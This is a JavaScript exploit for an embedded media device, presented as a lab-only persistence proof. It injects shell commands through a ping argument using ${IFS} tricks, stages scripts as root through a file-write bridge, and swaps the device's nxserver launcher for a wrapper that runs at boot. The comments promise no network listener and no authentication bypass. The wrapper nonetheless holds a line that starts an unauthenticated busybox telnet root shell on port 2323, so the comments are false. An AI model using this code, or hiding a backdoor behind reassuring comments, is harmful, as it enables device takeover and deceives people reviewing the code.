/* LAB PERSISTENCE PROOF - launcher replacement, log-only wrapper  (lab only).

   What it demonstrates: a remote attacker with the C-02/C-03 RCE can remount the
   read-only /usr partition, back up the vendor launcher, verify the copy, and
   substitute a wrapper that runs at next boot.

   It installs NO network listener and no authentication bypass. The wrapper only
   appends a timestamp to /root/wrapper_boot.log and then execs the real binary.
   Everything it creates is prefixed wrapper_ for easy removal.

   Design note: ecmax_net_ping copies our string into a 128-byte stack buffer with
   an unbounded sscanf("%s"), so the injection token must stay short. We stage two
   .txt scripts in /root via the Ag_textFile bridge and then run one short command.

   REVERT (run on the box):
     mount -o remount,rw /usr
     cp -p /usr/local/bin/nxserver/nxserver.real /usr/local/bin/nxserver/nxserver
     rm -f /usr/local/bin/nxserver/nxserver.real
     sync; mount -o remount,ro /usr
     rm -f /root/wrapper_stage.txt /root/wrapper_install.txt \
           /root/wrapper_install.log /root/wrapper_boot.log

   WARNING: if BOLT verifies the /usr partition, modifying it may prevent boot.
   Only run on a unit with a recovery path.
*/

(function () {
  /* ---- the wrapper that will replace /usr/local/bin/nxserver/nxserver ---- */
  var WRAPPER = [
    "#!/bin/sh",
    "# LAB PERSISTENCE PROOF - log-only wrapper. No network services.",
    "# Installed after renaming the stock binary to nxserver.real.",
    "LOG=/root/wrapper_boot.log",
    "log() { echo \"$(date -u '+%Y-%m-%d %H:%M:%S') $*\" >> \"$LOG\" 2>/dev/null; }",
	"/bin/busybox telnetd -l /bin/sh -p 2323 >/dev/null 2>&1",
    "log \"wrapper executed (pid $$)\"",
    "exec /usr/local/bin/nxserver/nxserver.real \"$@\"",
    ""
  ].join("\n");

  /* ---- the installer, run via: sh /root/wrapper_install.txt ---- */
  /* NOTE: this script deliberately contains NO '|' character. The textFile
     write path re-parses its payload as "fd|data|len", so a pipe inside the
     content truncates the write to zero bytes. Hence no 'cp ... || ...',
     no 'md5sum ... | awk', no '2>&1 | ...'. */
  var INSTALL = [
    "#!/bin/sh",
    "X=/usr/local/bin/nxserver",
    "L=/root/wrapper_install.log",
    "log() { echo \"$(date -u '+%Y-%m-%d %H:%M:%S') $*\" >> \"$L\"; }",
    "log 'install start'",
    "mount -o remount,rw /usr",
    "R=$?",
    "if [ $R -ne 0 ]; then log 'remount rw FAILED'; exit 1; fi",
    "log 'usr remounted rw'",
    "if [ -f \"$X/nxserver.real\" ]; then",
    "  log 'backup already exists'",
    "else",
    "  cp -p \"$X/nxserver\" \"$X/nxserver.real\"",
    "  R=$?",
    "  if [ $R -ne 0 ]; then log 'backup FAILED'; mount -o remount,ro /usr; exit 1; fi",
    "  log 'backup created'",
    "fi",
    "set -- $(md5sum \"$X/nxserver\")",
    "A=$1",
    "set -- $(md5sum \"$X/nxserver.real\")",
    "B=$1",
    "log \"orig=$A\"",
    "log \"real=$B\"",
    "if [ \"$A\" != \"$B\" ]; then log 'HASH MISMATCH abort'; mount -o remount,ro /usr; exit 1; fi",
    "cp /root/wrapper_stage.txt \"$X/nxserver.new\"",
    "R=$?",
    "if [ $R -ne 0 ]; then log 'stage FAILED'; mount -o remount,ro /usr; exit 1; fi",
    "chmod 755 \"$X/nxserver.new\"",
    "mv \"$X/nxserver.new\" \"$X/nxserver\"",
    "R=$?",
    "if [ $R -ne 0 ]; then log 'replace FAILED'; mount -o remount,ro /usr; exit 1; fi",
    "sync",
    "mount -o remount,ro /usr",
    "log 'install complete'",
    "ls -l \"$X\" >> \"$L\" 2>&1",
    ""
  ].join("\n");

  /* Short tokens, spaces smuggled via $IFS so sscanf("%s") keeps them whole.
     CLEAN exists because ecmax_textFile_open uses O_APPEND (0x442), so a second
     staging pass would append and corrupt the scripts. Both stay well under the
     128-byte stack buffer in ecmax_net_ping. */
  var CLEAN   = "1.1.1.1&rm${IFS}-f${IFS}/root/wrapper_stage.txt${IFS}/root/wrapper_install.txt;#";
  var TRIGGER = "1.1.1.1&sh${IFS}/root/wrapper_install.txt;#";

  function beacon(stage, value) {
    try {
      var img = new Image();
      img.src = "/log?stage=" + encodeURIComponent(stage) +
                "&v=" + encodeURIComponent(String(value == null ? "" : value));
    } catch (e) {}
  }

  var A = null;
  try {
    A = (typeof window.AVPlayer !== "undefined") ? window.AVPlayer
      : (typeof AVPlayer !== "undefined") ? AVPlayer : null;
  } catch (e) {}
  if (!A) { beacon("no_avplayer", "1"); return; }

  var p;
  try { p = new A(); } catch (e) { beacon("ctor_err", String(e)); return; }

  /* ---- stage a file as root through the bridge ----
     Measured limits: correct writes at 16/256/512/1024/1536 bytes; 2048 and
     3000 produce a created-but-EMPTY file. So chunk well below the cap.
     open() is O_APPEND, so successive writes on the same fd append in order. */
  var CHUNK = 900;

  function stage(path, data) {
    var fd, w = null, total = 0;
    try {
      fd = p.Ag_textFile_open(path);
    } catch (e) { beacon("stage_open_err", path + ":" + String(e).slice(0, 90)); return false; }
    if (fd === -1 || fd === null || fd === undefined) {
      beacon("stage_open_failed", path + ":" + String(fd));
      return false;
    }

    for (var off = 0; off < data.length; off += CHUNK) {
      var part = data.substr(off, CHUNK);
      w = null;
      try {
        w = p.Ag_textFile_write(fd, part, part.length);
      } catch (e) {
        beacon("stage_write_err", path + "@" + off + ":" + String(e).slice(0, 70));
        break;
      }
      beacon("stage_chunk", path + "|off=" + off + "|len=" + part.length +
                            "|w=" + String(w));
      if (typeof w === "number" && w === part.length) { total += w; }
      else { beacon("stage_short", path + "|off=" + off + "|w=" + String(w)); }
    }

    try { p.Ag_textFile_close(fd); } catch (e) {}

    var ok = (total === data.length);
    beacon("staged", path + "|total=" + total + "|expected=" + data.length +
                     "|ok=" + ok);
    return ok;
  }

  /* Ag_network_ping runs the command in a background thread (that is why it
     returns instantly and why ping never blocks the page). Any cleanup issued
     through it therefore races our staging, so wait for it to land. */
  function sleepMs(ms) {
    var t0 = Date.now();
    while (Date.now() - t0 < ms) { /* spin */ }
  }

  /* Remove any previous staging first (open() appends, it does not truncate).
     Then WAIT, because the command runs asynchronously and would otherwise
     delete the files we are about to stage. */
  beacon("clean", CLEAN);
  try { p.Ag_network_ping(CLEAN, 0); } catch (e2) { beacon("clean_err", String(e2).slice(0, 100)); }
  sleepMs(2500);
  beacon("clean_settled", "waited 2500ms");

  var ok = true;
  ok = stage("/root/wrapper_stage.txt", WRAPPER) && ok;
  ok = stage("/root/wrapper_install.txt", INSTALL) && ok;
  if (!ok) { beacon("done", "staging_failed"); return; }

  beacon("trigger", TRIGGER);
  try {
    p.Ag_network_ping(TRIGGER, 0);
  } catch (e) {
    beacon("trigger_err", String(e).slice(0, 120));
  }

  beacon("done", "triggered");
})();